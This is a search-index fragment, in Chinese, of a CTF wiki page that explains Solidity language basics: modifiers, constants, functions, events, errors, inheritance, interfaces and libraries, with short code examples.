<li>\u4fee\u6539\u5668\uff08modifier\uff09\u53ef\u4ee5\u4fee\u6539\u51fd\u6570\u7684\u884c\u4e3a</li> <li>\u4fee\u6539\u5668\u662f\u5408\u7ea6\u7684\u53ef\u7ee7\u627f\u5c5e\u6027\uff0c\u53ef\u4ee5\u88ab\u6d3e\u751f\u5408\u7ea6\u8986\u76d6\uff0c\u524d\u63d0\u662f\u4fee\u6539\u5668\u88ab\u6807\u8bb0\u4e3a\u4e86 virtual</li> <li>\u5b9a\u4e49\uff1a     <pre><code>modifier onlyOwner {\n    require(msg.sender == owner);\n    _;\n}\nmodifier costs(uint price) {\n    require(msg.value &gt;= price);\n    _;\n}\n</code></pre><ul> <li>\u53ef\u4ee5\u5e26\u53c2\u6570\uff0c\u4e5f\u53ef\u4ee5\u7701\u7565\u53c2\u6570\uff08\u751a\u81f3\u7701\u7565\u62ec\u53f7\uff09</li> <li>\u4e0b\u5212\u7ebf\u7684\u4f4d\u7f6e\uff08\u5360\u4f4d\u7b26\uff09\u8868\u793a\u8981\u63d2\u5165\u7684\u88ab\u4fee\u6539\u7684\u51fd\u6570\u4f53</li> <li>\u5360\u4f4d\u7b26\u53ef\u4ee5\u591a\u6b21\u51fa\u73b0\uff0c\u6bcf\u4e2a\u90fd\u4f1a\u66ff\u6362\u6210\u88ab\u4fee\u6539\u7684\u51fd\u6570\u4f53</li> </ul> </li> <li>\u4fee\u6539\u5668\u4e0d\u80fd\u8bbf\u95ee\u3001\u66f4\u6539\u4fee\u6539\u7684\u51fd\u6570\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c</li> <li>\u9700\u8981\u4f20\u5165\u53c2\u6570\u65f6\u9700\u8981\u663e\u5f0f\u5199\u5165     <pre><code>function buy(uint price) public payable costs(price) {\n    // ...\n}\n</code></pre></li> <li>\u53ef\u4ee5\u52a0\u591a\u4e2a modifier\uff0c\u7a7a\u683c\u5206\u9694\uff0c\u4e14\u4ece\u5de6\u5230\u53f3\u4f9d\u6b21\u8fdb\u884c\u8bc4\u4f30</li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_20","title":"\u5e38\u91cf\u548c\u4e0d\u53ef\u53d8\u7684\u72b6\u6001\u53d8\u91cf","text":"<ul> <li>\u72b6\u6001\u53d8\u91cf\u53ef\u4ee5\u6807\u8bb0\u4e3a constant \u6216\u8005 immutable\uff0c\u4ed6\u4eec\u5728\u8fd0\u884c\u65f6\u5b57\u8282\u7801\u4e2d\u90fd\u4f1a\u88ab\u76f4\u63a5\u66ff\u6362\u4e3a\u76f8\u5e94\u7684\u503c\uff0c\u800c\u4e0d\u9700\u8981\u8bfb\u53d6\u63d2\u69fd\uff0cgas \u6d88\u8017\u8981\u5c0f\u5f97\u591a</li> <li>constant \u548c immutable \u7684\u533a\u522b\uff1a<ul> <li>constant \u662f\u5728\u7f16\u8bd1\u671f\u5c31\u8981\u77e5\u9053\u503c\u7684\uff0c\u4f1a\u5168\u5c40\u66ff\u6362\u7b26\u53f7\uff08\u7c7b\u4f3c C \u7684\u5b8f\uff09</li> <li>immutable \u53ef\u4ee5\u5728\u6784\u9020\u51fd\u6570\u4e2d\u8fdb\u884c\u4e00\u6b21\u8d4b\u503c\uff0c\u4e4b\u540e\u4f1a\u5728\u62f7\u8d1d\u8fd0\u884c\u65f6\u51fd\u6570\u65f6\u8fdb\u884c\u66ff\u6362</li> <li>immutable \u5728\u66ff\u6362\u7684\u65f6\u5019\u4f1a\u4fdd\u7559 32 \u4e2a\u5b57\u8282\uff0c\u800c constant \u4e0d\u4f1a\uff0c\u56e0\u6b64 constant \u6709\u65f6\u6bd4 immutable \u66f4\u504f\u79fb</li> </ul> </li> <li>constant \u548c immutable \u76ee\u524d\u53ea\u652f\u6301 string \u548c\u503c\u7c7b\u578b</li> <li>constant \u4e2d\u4e0d\u53ef\u4ee5\u8bbf\u95ee storage\u3001\u533a\u5757\u4fe1\u606f\u3001\u6267\u884c\u4fe1\u606f\u7684\u7b49\u3002\u4f46\u53ef\u4ee5\u4f7f\u7528\u5185\u7f6e\u51fd\u6570\u5982 kaccak256 \u7b49</li> <li>immutable \u9650\u5236\u8981\u6bd4 constant \u5c11\uff0c\u56e0\u4e3a\u662f\u5728\u8fd0\u884c creationCode \u7684\u9002\u5408\u8ba1\u7b97\u503c\u7684</li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_21","title":"\u51fd\u6570","text":"<ul> <li>\u51fd\u6570\u53c2\u6570<ul> <li>\u548c\u58f0\u660e\u53d8\u91cf\u4e00\u6837\uff0c\u6307\u5b9a\u7c7b\u578b\u548c\u540d\u79f0</li> <li>\u51fd\u6570\u5185\u6ca1\u6709\u4f7f\u7528\u7684\u53c2\u6570\u53ef\u4ee5\u7701\u7565\u540d\u79f0</li> </ul> </li> <li>\u51fd\u6570\u8fd4\u56de\u503c<ul> <li>\u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c</li> <li>\u51fd\u6570\u58f0\u660e\u6700\u540e\u4f7f\u7528 returns \u5173\u952e\u5b57</li> <li>\u53ef\u4ee5\u901a\u8fc7\u8fd4\u56de\u503c\u7684\u53d8\u91cf\u540d\u8fdb\u884c\u9690\u5f0f\u8fd4\u56de     <pre><code>function func(uint a, uint b) public pure returns (uint sum, uint product) {\n    sum = a + b;\n    product = a * b;\n}\n</code></pre></li> <li>\u4e5f\u53ef\u4ee5\u901a\u8fc7 return \u8bed\u53e5\u624b\u52a8\u8fd4\u56de\uff1a     <pre><code>function func(uint a, uint b) public pure returns (uint sum, uint product) {\n    return (a + b, a * b)\n}\n</code></pre><ul> <li>\u6b64\u65f6 returns \u4e2d\u7684\u53d8\u91cf\u540d\u662f\u4e0d\u5fc5\u9700\u7684</li> </ul> </li> <li>\u4e0d\u53ef\u4ee5\u5728\u975e internal \u7684\u51fd\u6570\u4e2d\u8fd4\u56de\u4ee5\u4e0b\u7c7b\u578b\uff1a<ul> <li>mappings</li> <li>internal \u51fd\u6570</li> <li>\u4f4d\u7f6e\u4e3a storage \u7684\u5f15\u7528\u7c7b\u578b</li> <li>\u4f7f\u7528 ABI v1 \u7f16\u7801\u5668\u65f6\u7684\u591a\u7ef4\u6570\u7ec4</li> <li>\u4f7f\u7528 ABI v1 \u7f16\u7801\u5668\u65f6\u7684\u7ed3\u6784\u4f53</li> </ul> </li> </ul> </li> <li>\u5408\u7ea6\u5916\u4e5f\u53ef\u4ee5\u5b9a\u4e49\u51fd\u6570\uff0c\u79f0\u4e3a free functions\uff0c\u9ed8\u8ba4\u53ef\u89c1\u6027\u662f internal \u7684<ul> <li>\u7f16\u8bd1\u65f6\u4f1a\u5c06\u4ee3\u7801\u6f5c\u5165\u8c03\u7528\u5b83\u7684\u5408\u7ea6\u4e2d</li> <li>\u4e5f\u53ef\u4ee5\u8c03\u7528\u5176\u4ed6\u5408\u7ea6\u3001\u53d1\u9001\u4ee5\u592a\u5e01\uff0c\u81ea\u6bc1\u7b49</li> <li>\u4e0d\u80fd\u8bbf\u95ee this \u53d8\u91cf\uff0c\u4e0d\u80fd\u8bbf\u95ee storage \u548c\u4e0d\u5728\u4f5c\u7528\u57df\u5185\u7684\u51fd\u6570</li> </ul> </li> <li>\u72b6\u6001\u53ef\u53d8\u6027<ul> <li>\u53ef\u4ee5\u5728\u51fd\u6570\u5b9a\u4e49\u4e2d\u52a0\u5165 view \u6216 pure \u6765\u6307\u5b9a\u8be5\u51fd\u6570\u7684\u72b6\u6001\u53ef\u53d8\u6027</li> <li>view\uff1a\u627f\u8bfa\u4e0d\u4f1a\u4fee\u6539\u72b6\u6001<ul> <li>\u5bf9\u4e8e\u62dc\u5360\u5ead\u6216\u66f4\u9ad8\u7248\u672c\u7684 EVM\uff0c\u4f1a\u4f7f\u7528 STATICCALL \u6765\u8c03\u7528 view \u51fd\u6570\u786e\u4fdd\u4e0d\u4fee\u6539\u72b6\u6001</li> <li>\u5bf9\u4e8e\u5e93\u4e2d\u7684 view \u51fd\u6570\uff0c\u4ecd\u7136\u4f1a\u4f7f\u7528 DELEGATECALL \u6765\u8c03\u7528\uff0c\u4f46\u662f\u4f1a\u5728\u7f16\u8bd1\u65f6\u8fdb\u884c\u68c0\u67e5</li> <li>\u4ee5\u4e0b\u8bed\u53e5\u4f1a\u88ab\u89c6\u4e3a\u4fee\u6539\u72b6\u6001\uff1a<ul> <li>\u5199\u5165\u72b6\u6001\u53d8\u91cf</li> <li>\u89e6\u53d1\u4e8b\u4ef6</li> <li>\u521b\u5efa\u5176\u4ed6\u5408\u7ea6</li> <li>\u4f7f\u7528 selfdestruct</li> <li>\u901a\u8fc7\u8c03\u7528\u53d1\u9001\u4ee5\u592a\u5e01</li> <li>\u8c03\u7528\u6ca1\u6709\u6807\u8bb0\u4e3a view \u548c pure \u7684\u51fd\u6570</li> <li>\u4f7f\u7528 low-level \u7684 call</li> <li>\u5185\u8054\u6c47\u7f16\u4e2d\u5305\u542b\u7279\u5b9a\u5b57\u8282\u7801</li> </ul> </li> <li>0.5.0 \u7248\u672c\u4e4b\u524d constant \u662f view \u7684\u522b\u540d</li> <li>getter \u65b9\u6cd5\u4f1a\u88ab\u81ea\u52a8\u6807\u8bb0\u4e3a view</li> </ul> </li> <li>pure\uff1a\u627f\u8bfa\u4e0d\u4f1a\u8bfb\u53d6\u3001\u4fee\u6539\u72b6\u6001<ul> <li>\u5bf9\u4e8e\u62dc\u5360\u5ead\u6216\u66f4\u9ad8\u7248\u672c\u7684 EVM\uff0c\u4f1a\u4f7f\u7528 STATICCALL \u6765\u8c03\u7528 pure \u51fd\u6570\u786e\u4fdd\u4e0d\u4fee\u6539\u72b6\u6001\uff08\u4f46\u4e0d\u80fd\u786e\u4fdd\u4e0d\u8bfb\u53d6\uff09</li> <li>\u8bfb\u53d6 immutable \u53d8\u91cf\u4e5f\u7b97\u4e3a\u975e\u7eaf\u64cd\u4f5c</li> <li>\u4ee5\u4e0b\u60c5\u51b5\u4f1a\u88ab\u89c6\u4e3a\u8bfb\u53d6\u72b6\u6001\uff1a<ul> <li>\u8bfb\u53d6\u72b6\u6001\u53d8\u91cf</li> <li>\u8bbf\u95ee balance\uff08address(this).balance \u6216 addr.balance \u90fd\u7b97\uff09</li> <li>\u8bbf\u95ee block\u3001tx\u3001msg \u6210\u5458\uff08msg.sig \u548c msg.data \u9664\u5916\uff09</li> <li>\u8c03\u7528\u6ca1\u6709\u6807\u8bb0\u4e3a pure \u7684\u51fd\u6570</li> <li>\u5185\u8054\u6c47\u7f16\u4e2d\u5305\u542b\u7279\u5b9a\u5b57\u8282\u7801</li> </ul> </li> </ul> </li> </ul> </li> <li>\u7279\u6b8a\u51fd\u6570<ul> <li>receive \u51fd\u6570<ul> <li>\u4e00\u4e2a\u5408\u7ea6\u6700\u591a\u6709\u4e00\u4e2a receive \u51fd\u6570\u3002\u5b9a\u4e49\u4e3a\uff1a     <pre><code>receive() external payable { ... }\n</code></pre><ul> <li>\u6ca1\u6709 function \u5173\u952e\u5b57</li> <li>\u4e0d\u80fd\u6709\u53c2\u6570\uff0c\u4e0d\u80fd\u8fd4\u56de\u4efb\u4f55\u503c\uff0c\u5fc5\u987b\u662f external \u53ef\u89c1\u6027\uff0c\u548c payable \u7684</li> <li>\u53ef\u4ee5\u662f virtual \u7684\uff08\u53ef\u4ee5\u88ab\u8986\u76d6\uff09\uff0c\u53ef\u4ee5\u6709 modifier</li> </ul> </li> <li>receive \u51fd\u6570\u5728\u5408\u7ea6\u6536\u5230\u7a7a calldata \u65f6\u6267\u884c\uff0c\u4f8b\u5982\u901a\u8fc7\u63a5\u6536\u901a\u8fc7 .send \u6216\u8005 .transfer \u53d1\u9001\u7684\u4ee5\u592a\u5e01\u65f6</li> <li>\u5982\u679c\u6ca1\u6709 receive \u51fd\u6570\u4f1a\u68c0\u67e5\u6709\u6ca1\u6709 payable \u7684 fallback \u51fd\u6570</li> <li>\u6ca1\u6709 receive \u4e5f\u6ca1\u6709 payable \u7684 fallback \u7684\u8bdd\uff0c\u5408\u7ea6\u5c06\u4e0d\u80fd\u901a\u8fc7\u4ea4\u6613\u63a5\u6536\u4ee5\u592a\u5e01\uff08\u63a5\u6536\u7684\u8bdd\u4f1a\u629b\u51fa\u5f02\u5e38\uff09</li> <li>\u6700\u574f\u60c5\u51b5\u4e0b receive \u51fd\u6570\u53ea\u6709 2300 \u7684 gas \u53ef\u7528\uff08\u63a5\u6536\u6765\u81ea send \u548c transfer \u65f6\uff09<ul> <li>\u6b64\u65f6\u53ea\u53ef\u4ee5\u8fdb\u884c\u57fa\u672c\u7684\u65e5\u5fd7\u64cd\u4f5c</li> <li>\u5199\u5165\u5b58\u50a8\u3001\u521b\u5efa\u5408\u7ea6\u3001\u8c03\u7528\u5927\u91cf\u6d88\u8017 gas \u7684\u5916\u90e8\u51fd\u6570\u3001\u53d1\u9001\u4ee5\u592a\u5e01\u90fd\u4f1a\u6d88\u8017\u6bd4 2300 \u66f4\u591a\u7684 gas</li> </ul> </li> </ul> </li> <li>fallback \u51fd\u6570<ul> <li>\u4e00\u4e2a\u5408\u7ea6\u6700\u591a\u6709\u4e00\u4e2a fallback \u51fd\u6570\u3002\u5b9a\u4e49\u4e3a\uff1a     <pre><code>fallback() external [payable] { ... }\nfallback(bytes calldata input) external [payable] returns (bytes memory output) { ... }\n</code></pre><ul> <li>\u6ca1\u6709 function \u5173\u952e\u5b57</li> <li>\u5fc5\u987b\u662f external \u53ef\u89c1\u6027</li> <li>\u53ef\u4ee5\u662f virtual \u7684\uff08\u53ef\u4ee5\u88ab\u8986\u76d6\uff09\uff0c\u53ef\u4ee5\u6709 modifier</li> </ul> </li> <li>fallback \u5728\u4ee5\u4e0b\u60c5\u51b5\u4e0b\u88ab\u8c03\u7528\uff1a<ul> <li>\u6709 calldata\uff0c\u4f46\u5408\u7ea6\u4e2d\u6ca1\u6709\u5339\u914d\u7684\u7b7e\u540d</li> <li>\u6ca1\u6709 calldata\uff0c\u4e14\u6ca1\u6709 receive \u51fd\u6570</li> </ul> </li> <li>\u8981\u63a5\u6536\u4ee5\u592a\u5e01\u7684\u8bdd\u4e00\u5b9a\u8981\u6807\u8bb0\u4e3a payable</li> <li>\u5982\u679c\u5b9a\u4e49\u4e3a\u5e26\u53c2\u6570\u7684\u7248\u672c\uff0c\u5219\uff1a<ul> <li>input \u7b49\u4ef7\u4e8e msg.data</li> <li>output \u4e0d\u4f1a\u7ecf\u8fc7\u7f16\u7801\uff0c\u4f1a\u76f4\u63a5\u65e0\u4fee\u6539\u5730\u8fd4\u56de\uff08\u751a\u81f3\u4e0d\u586b\u5145\uff09</li> </ul> </li> <li>\u5728\u6700\u574f\u60c5\u51b5\u4e0b\uff0c\u548c receive \u4e00\u6837\u53ea\u6709 2300 gas \u53ef\u7528\uff0c\u4f46\u5728 gas \u5145\u8db3\u60c5\u51b5\u4e0b\u53ef\u4ee5\u4efb\u610f\u6267\u884c\u590d\u6742\u64cd\u4f5c\u3002</li> </ul> </li> <li>\u65e0\u6cd5\u63a5\u6536\u4ee5\u592a\u5e01\u7684\u5408\u7ea6\u4e5f\u53ef\u4ee5\u901a\u8fc7 coinbase transaction\uff08\u6316\u77ff\u5956\u52b1\uff09\u548c selfdestruct \u76ee\u7684\u5730\u5740\u7684\u65b9\u5f0f\u5f3a\u5236\u63a5\u6536\u4ee5\u592a\u5e01\uff0c\u4e14\u65e0\u6cd5\u7ed5\u8fc7</li> </ul> </li> <li>\u51fd\u6570\u91cd\u8f7d<ul> <li>\u4e00\u4e2a\u5408\u7ea6\u53ef\u4ee5\u6709\u591a\u4e2a\u540c\u540d\uff0c\u4f46\u662f\u53c2\u6570\u7c7b\u578b\u4e0d\u540c\u7684\u51fd\u6570\uff0c\u4f8b\u5982\uff1a     <pre><code>contract A {\n    function f(uint value) public pure returns (uint out) {\n        out = value;\n    }\n\n    function f(uint value, bool really) public pure returns (uint out) {\n        if (really)\n            out = value;\n    }\n}\n</code></pre></li> <li>\u5728\u8c03\u7528\u65f6\u4f1a\u8003\u8651\uff0c\u5982\u679c\u6240\u6709\u53c2\u6570\u90fd\u53ef\u4ee5\u9690\u5f0f\u8f6c\u6362\u4e3a\u9884\u671f\u7c7b\u578b\uff0c\u5219\u53ef\u4ee5\u8c03\u7528\u8be5\u51fd\u6570</li> <li>\u5982\u679c\u6709\u591a\u4e2a\u51fd\u6570\u53ef\u4ee5\u8c03\u7528\uff0c\u5219\u4f1a\u5931\u8d25\uff0c\u4f8b\u5982\uff1a     <pre><code>contract A {\n    function f(uint8 val) public pure returns (uint8 out) {\n        out = val;\n    }\n\n    function f(uint256 val) public pure returns (uint256 out) {\n        out = val;\n    }\n}\n</code></pre><ul> <li>\u8c03\u7528 f(50) \u7684\u8bdd\u4e0d\u4f1a\u6210\u529f\uff0c\u56e0\u4e3a 50 \u53ef\u4ee5\u540c\u65f6\u9690\u5f0f\u8f6c\u6362\u4e3a uint8 \u548c uint256</li> </ul> </li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_22","title":"\u4e8b\u4ef6","text":"<ul> <li>Solidity \u63d0\u4f9b\u4e86\u6bd4 EVM \u7684 log \u66f4\u9ad8\u7ea7\u7684\u4e8b\u4ef6\u8bb0\u5f55\uff0c\u79f0\u4e3a event</li> <li>\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 RPC \u63a5\u53e3\u8ba2\u9605\u548c\u76d1\u542c events</li> <li>event \u662f\u5408\u7ea6\u7684\u53ef\u7ee7\u627f\u6210\u5458\uff0c\u8c03\u7528\u65f6\u4f1a\u5c06\u53c2\u6570\u5b58\u50a8\u5230\u4ea4\u6613\u65e5\u5fd7\u4e2d\uff0c\u4fdd\u7559\u5728\u533a\u5757\u94fe\u4e0a</li> <li>\u65e5\u5fd7\u548c event \u5185\u5bb9\u4e0d\u80fd\u5728\u5408\u7ea6\u4e2d\u8bbf\u95ee</li> <li>\u6700\u591a\u53ef\u4ee5\u4e3a\u4e09\u4e2a\u53c2\u6570\u6807\u8bb0 indexed<ul> <li>\u6807\u8bb0\u4e3a indexed \u7684\u53c2\u6570\u4f1a\u88ab\u5b58\u5230\u4e00\u4e2a\u7279\u6b8a\u7684\u79f0\u4e3a topics \u7684\u6570\u636e\u7ed3\u6784\u4e2d</li> <li>\u4e00\u4e2a topic \u53ea\u80fd\u5305\u542b 32 \u5b57\u8282\uff0c\u66f4\u591a\u7684\u9700\u8981\u8ba1\u7b97 keccak256 \u54c8\u5e0c</li> <li>\u5176\u4f59\u90e8\u5206\u4f1a\u88ab ABI \u7f16\u7801\u7136\u540e\u5b58\u5728 log \u7684\u6570\u636e\u90e8\u5206</li> <li>topics \u652f\u6301\u641c\u7d22\u4e8b\u4ef6\uff0c\u53ef\u4ee5\u7528\u6765\u8fc7\u6ee4</li> </ul> </li> <li>\u4e8b\u4ef6\u6709\u6210\u5458 selector\uff0c\u662f\u4e00\u4e2a\u5305\u4e8b\u4ef6\u7b7e\u540d\u7684 keccak256 \u54c8\u5e0c\u7684 bytes32 \u7c7b\u578b</li> <li>\u901a\u8fc7 event \u5173\u952e\u5b57\u5b9a\u4e49\uff1a     <pre><code>event Deposit(\n    address indexed from,\n    bytes32 indexed id,\n    uint value\n);\n</code></pre></li> <li>\u901a\u8fc7 emit \u5173\u952e\u5b57\u89e6\u53d1\u4e8b\u4ef6\uff1a     <pre><code>emit Deposit(msg.sender, id, msg.value);\n</code></pre></li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_23","title":"\u9519\u8bef\u4e0e\u56de\u6eda","text":"<ul> <li>Solidity \u63d0\u4f9b\u4e86 Error \u6765\u4ee5\u66f4\u65b9\u4fbf\u3001\u7701 gas \u7684\u65b9\u5f0f\u5411\u7528\u6237\u4f20\u8fbe\u4e3a\u4ec0\u4e48\u64cd\u4f5c\u5931\u8d25\u4e86</li> <li>\u4e00\u79cd\u9519\u8bef\u53ef\u4ee5\u901a\u8fc7 error \u5173\u952e\u5b57\u6765\u5b9a\u4e49\uff1a     <pre><code>error InsufficientBalance(uint256 available, uint256 required);\n</code></pre></li> <li>\u7136\u540e\u53ef\u4ee5\u4e14\u4ec5\u53ef\u4ee5\u5728 revert \u8bed\u53e5\u4e2d\u4f7f\u7528\uff1a     <pre><code>...\nrevert InsufficientBalance({\n    available: balance[msg.sender],\n    required: amount\n});\n</code></pre></li> <li>\u8fd9\u6837\u540c\u6837\u4f7f\u7528 ABI \u7f16\u7801\u6765\u8fd4\u56de\u4fe1\u606f\uff0c\u5305\u62ec error \u7684 selector \u548c\u5177\u4f53\u5185\u5bb9\u7684\u7f16\u7801</li> <li>require(condition, \"description\") \u7b49\u4ef7\u4e8e if (!condition) revert Error(\"description\")\uff0c\u5176\u4e2d Error \u4e3a\u5185\u7f6e\u7c7b\u578b</li> <li>assert \u4ea7\u751f\u7684 revert \u7b49\u4ef7\u4e8e revert Panic(uint256)\uff0cPanic \u4e5f\u662f\u4e00\u4e2a\u5185\u7f6e\u7c7b\u578b</li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_24","title":"\u7ee7\u627f","text":"<ul> <li>Solidity \u7684\u7ee7\u627f\u673a\u5236\u7c7b\u4f3c Python\uff0c\u6709\u591a\u91cd\u7ee7\u627f</li> <li>\u901a\u8fc7\u5b9a\u4e49\u5408\u7ea6\u65f6\u52a0\u5165 is \u5b50\u53e5\u6765\u7ee7\u627f</li> <li>\u53ef\u4ee5\u901a\u8fc7 ContractName.functionName \u6216 super.functionName \u7684\u5f62\u5f0f\u8c03\u7528</li> <li>\u7ee7\u627f\u65f6\u72b6\u6001\u53d8\u91cf\u4e0d\u80fd\u906e\u853d\uff08shadowing\uff09\uff0c\u5373\u4e0d\u80fd\u521b\u5efa\u65b0\u7684\u540c\u540d\u53d8\u91cf</li> <li>\u7ee7\u627f\u8986\u76d6\u51fd\u6570\u65f6\uff0c\u53ef\u4ee5\u88ab\u8986\u76d6\u7684\u51fd\u6570\u5fc5\u987b\u6807\u8bb0\u4e3a virtual\uff0c\u8fdb\u884c\u8986\u76d6\u7684\u51fd\u6570\u5fc5\u987b\u6807\u8bb0\u4e3a override<ul> <li>\u4ece\u591a\u4e2a\u5408\u7ea6\u8986\u76d6\u51fd\u6570\u8981\u7528 override \u663e\u793a\u5199\u51fa\u6240\u6709\u8986\u76d6\u7684\u51fd\u6570</li> </ul> </li> <li>\u63a5\u53e3\u4e2d\u6240\u6709\u51fd\u6570\u81ea\u52a8\u4e3a virtual</li> <li>\u4ece 0.8.8 \u5f00\u59cb\uff0c\u8986\u76d6\u63a5\u53e3\u51fd\u6570\u65f6\u4e0d\u9700\u8981\u6807\u8bb0 override\uff08\u591a\u7ee7\u627f\u9664\u5916\uff09</li> <li>modifier \u7684\u8986\u76d6\u540c\u6837\u9700\u8981 virtual \u548c override</li> <li>\u6784\u9020\u51fd\u6570\u53ea\u9488\u5bf9\u4e8e\u5f53\u524d\u5408\u7ea6\uff0c\u7ee7\u627f\u5e26\u6709\u6709\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\u7684\u5408\u7ea6\u65f6\uff0c\u9700\u8981\u663e\u5f0f\u8c03\u7528\u7236\u7c7b\u6784\u9020\u51fd\u6570     <pre><code>contract Base {\n    constructor(uint x) { ... }\n}\n\ncontract Child1 is Base(1) {\n    constructor(uint x, uint y) { ... }\n}\n\ncontract Child2 is Base {\n    constructor(uint x) Base(x) { ... }\n}\n</code></pre></li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_25","title":"\u62bd\u8c61\u5408\u7ea6","text":"<ul> <li>\u5f53\u5408\u7ea6\u5305\u542b\u6ca1\u6709\u5b9e\u73b0\u7684\u90e8\u5206\u65f6\u8981\u6807\u8bb0\u4e3a abstract</li> <li>\u5f53\u4e0d\u6253\u7b97\u76f4\u63a5\u521b\u5efa\u8fd9\u4e2a\u5408\u7ea6\u7684\u65f6\u5019\uff0c\u4e5f\u53ef\u4ee5\u5c06\u5176\u6807\u8bb0\u4e3a abstract\uff08\u5373\u4f7f\u6240\u6709\u51fd\u6570\u90fd\u5b9e\u73b0\u4e86\uff09</li> <li>\u5728 contract \u524d\u52a0\u4e0a abstract \u5173\u952e\u5b57\u6765\u6807\u8bb0\u4e3a\u62bd\u8c61\u5408\u7ea6\uff0c\u6ca1\u6709\u5b9e\u73b0\u7684\u51fd\u6570\u4e0d\u9700\u8981\u5199\u51fd\u6570\u4f53\uff0c\u53ea\u9700\u8981\u7ed9\u51fa\u58f0\u660e\uff08\u6807\u8bb0\u4e3a virtual\uff09     <pre><code>abstract contract Feline {\n    function utterance() public virtual returns (bytes32);\n}\n</code></pre></li> <li>\u5176\u5b83\u5408\u7ea6\u901a\u8fc7\u7ee7\u627f\u62bd\u8c61\u5408\u7ea6\u6765\u5b9e\u73b0\u5b83<ul> <li>\u5982\u679c\u4ecd\u5f85\u5305\u542b\u6ca1\u6709\u5b9e\u73b0\u7684\u90e8\u5206\uff0c\u5219\u4ecd\u9700\u8981\u6807\u8bb0\u4e3a abstract</li> </ul> </li> <li>\u7c7b\u4f3c\u4e8e\u63a5\u53e3\uff0c\u4f46\u6bd4\u63a5\u53e3\u9650\u5236\u66f4\u5c11</li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_26","title":"\u63a5\u53e3","text":"<ul> <li>\u7c7b\u4f3c\u4e8e\u62bd\u8c61\u5408\u7ea6\uff0c\u4f46\u662f\uff1a<ul> <li>\u63a5\u53e3\u4e2d\u4e0d\u80fd\u5b9e\u73b0\u4efb\u4f55\u51fd\u6570</li> <li>\u4e0d\u80fd\u7ee7\u627f\u81ea\u5176\u4ed6\u5408\u7ea6\uff0c\u4f46\u53ef\u4ee5\u7ee7\u627f\u81ea\u5176\u5b83\u63a5\u53e3</li> <li>\u6240\u6709\u58f0\u660e\u7684\u51fd\u6570\u90fd\u5fc5\u987b\u6807\u8bb0\u4e3a external</li> <li>\u4e0d\u80fd\u58f0\u660e\u6784\u9020\u51fd\u6570\u3001\u72b6\u6001\u53d8\u91cf\u548c modifier</li> </ul> </li> <li>\u63a5\u53e3\u901a\u8fc7 interface \u5173\u952e\u5b57\u5b9a\u4e49\uff0c\u4e0d\u4f7f\u7528 contract\uff1a     <pre><code>interface Token {\n    enum TokenType { Fungible, NonFungible }\n    struct Coin { string obverse; string reverse; }\n    function transfer(address recipient, uint amount) external;\n}\n</code></pre></li> <li>\u63a5\u53e3\u4e2d\u7684\u6240\u6709\u51fd\u6570\u90fd\u9690\u542b virtual\uff0c\u8986\u76d6\u5b83\u4eec\u7684\u51fd\u6570\u4e5f\u4e0d\u9700\u8981\u6807\u8bb0 override</li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_27","title":"\u5e93","text":"<ul> <li>\u5e93\u662f\u4e00\u7ec4\u51fd\u6570\u7684\u96c6\u5408\uff0c\u53ef\u4ee5\u5728\u5176\u5b83\u5408\u7ea6\u4e2d\u4f7f\u7528<ul> <li>\u4f7f\u7528 DELEGATECALL \u8fdb\u884c\u8c03\u7528\uff08\u5bb6\u56ed\u7248\u672c\u524d\u4f7f\u7528 CALLCODE\uff09</li> </ul> </li> <li>\u5e93\u901a\u8fc7 library \u5173\u952e\u5b57\u5b9a\u4e49\uff1a     <pre><code>struct Data {\n    mapping (uint =&gt; bool) flags;\n}\nlibrary Set {\n    function insert(Data storage self, uint value) public returns (bool) {\n        if (self.flags[value]) return false;\n        self.flags[value] = true;\n        return true;\n    }\n    function remove(Data storage self, uint value) public returns (bool) {\n        if (!self.flags[value]) return false;\n        self.flags[value] = false;\n        return true;\n    }\n    function contains(Data storage self, uint value) public returns (bool) {\n        return self.flags[value];\n    }\n}\n</code></pre></li> <li>\u624b\u52a8\u4f7f\u7528\uff1a     <pre><code>contract C {\n    Set.Data knownValues;\n    function register(uint value) public {\n        require(Set.insert(knownValues, value));\n    }\n}\n</code></pre></li> <li>\u76f8\u6bd4\u4e8e\u5408\u7ea6\uff0c\u5e93\u6709\u4ee5\u4e0b\u9650\u5236\uff1a<ul> <li>\u4e0d\u80fd\u62e5\u6709\u72b6\u6001\u53d8\u91cf</li> <li>\u4e0d\u80fd\u7ee7\u627f\u6216\u8005\u88ab\u7ee7\u627f</li> <li>\u4e0d\u80fd\u63a5\u53d7\u4ee5\u592a\u5e01</li> <li>\u4e0d\u80fd\u88ab\u9500\u6bc1</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#using-for","title":"using for \u8bed\u53e5","text":"<ul> <li>\u8bed\u53e5 using A for B; \u8868\u793a\u5c06\u51fd\u6570 A \u4f5c\u4e3a\u4efb\u4f55 B \u7c7b\u578b\u7684\u53d8\u91cf\u7684\u6210\u5458\u51fd\u6570\uff0c\u4e14\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5176\u81ea\u8eab\uff08\u7c7b\u4f3c python \u4e2d\u7684 self\uff09<ul> <li>\u53ef\u4ee5\u5728\u6587\u4ef6\u8303\u56f4\uff08\u5408\u7ea6\u5916\uff09\uff0c\u4e5f\u53ef\u4ee5\u5728\u5408\u7ea6\u5185</li> </ul> </li> <li>using A for B \u4e2d\u7684 A \u53ef\u4ee5\u662f\uff1a<ul> <li>\u6587\u4ef6\u7ea7\u522b\u7684\u51fd\u6570\uff0c\u6216\u8005\u5e93\u4e2d\u7684\u51fd\u6570</li> <li>\u53ef\u4ee5\u5199\u591a\u4e2a\uff0c\u7528\u5927\u62ec\u53f7\u5305\u88f9\uff0c\u9017\u53f7\u9694\u5f00\uff1a     <pre><code>using {f, g, L.f} for uint;\n</code></pre></li> 